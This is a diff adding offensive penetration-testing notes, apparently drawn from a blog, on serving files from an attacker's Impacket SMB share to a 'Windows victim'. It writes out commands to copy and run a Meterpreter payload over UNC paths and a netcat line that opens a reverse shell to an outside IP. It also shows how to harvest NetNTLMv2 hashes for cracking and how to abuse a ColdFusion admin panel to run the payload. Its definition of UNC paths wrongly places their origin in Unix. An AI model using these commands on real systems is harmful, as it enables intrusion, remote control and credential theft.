@@ -1,1 +1,66 @@
+SMB
+SMB is built in to Windows and doesn’t require any special commands as Windows understands UNC paths. 
+You can simply use the standard copy and move commands and SMB handles the file transferring automatically for you. 
+What’s even better is Windows will actually let you execute files via UNC paths, meaning you can download and execute a payload in one command
 
+Enter smbserver.py, part of the Impacket project. Maybe one day I’ll write a blogpost without mentioning Impacket, but that day is not today.
+Impacket smbserver
+https://github.com/CoreSecurity/impacket
+Run smbserver on kali with a share name and the folder you want
+smbserver.py sharename /root/shells
+
+Then from windows victim we can easily copy files
+
+net view \\10.10.10.10
+dir \\10.10.10.10\BLAH
+copy \\10.10.10.10\BLAH\met443.exe .
+
+You can also just execute things remotely:
+\\10.10.10.10\BLAH\met443.exe
+
+Or we can map a network drive/share and run something remotely like this:
+net use s: \\\\192.168.49.128\\a
+s:\\nc.exe -e cmd.exe 192.168.49.128 139
+
+To launch a simple SMB server on port 445, just specify a share name and the path you want to share:
+# python smbserver.py sharename /root/shells
+
+The python script takes care of all the configurations for you, binds to 445, and accepts any authentication. 
+It will even print out the hashed challenge responses for any system that connects to it.
+
+In one line we’ve got an SMB share up and running. You can confirm it with smbclient from Linux: 
+$ smbclient -L 10.10.10.10 --no-pass
+
+Or with net view from Windows:
+net view \\10.10.10.10
+
+Copying the Files
+Since Windows handles UNC paths, you can just treat the ROPNOP share as if it’s just a local folder from Windows. 
+Basic Windows file commands like dir, copy, move, etc all just work:
+
+dir \\10.10.10.10\ROPNOP
+copy \\10.10.10.10\ROPNOP\app.exe
+
+If you look at the output from smbserver.py, you can see that every time we access the share it outputs the NetNTLMv2 hash from the current Windows user. 
+You can feed these into John or Hashcat and crack them if you want (assuming you can’t just elevate to System and get them from Mimikatz)
+
+Executing files from SMB. 
+Because of the way Windows treats UNC paths, it’s possible to just execute our binary directly from the SMB share without even needing to copy it over first. 
+Just run the executable as if it were already local and the payload will fire:
+
+C:\Desktop> \\10.10.10.10\ROPNOP\app.exe
+
+This proved incredibly useful during another ColdFusion exploit I came across. 
+After gaining access to an unprotected ColdFusion admin panel, I was able to configure a “system probe” to fire when a test failed. 
+It let me execute a program as a failure action, and I just used a UNC path to execute a Meterpreter payload hosted from my Kali machine:
+
+Probe Failure - Check Fail if the response does not contain the string 
+foobar
+Check execute the program \\10.10.10.10\ROPNOP\app.exe 
+When the probe fails, coldfusion connects to your smb chare and executes the payload 
+
+
+UNC = Universal Naming Convention Path
+UNC path is a standard to identify servers, printers, and other resources within a network, which originated in the Unix community. 
+It makes use of double slashes or backslashes to precede the name of the computer in Windows. 
+The paths (disks and directories) within the computer are separated with a single slash or backslash (\).
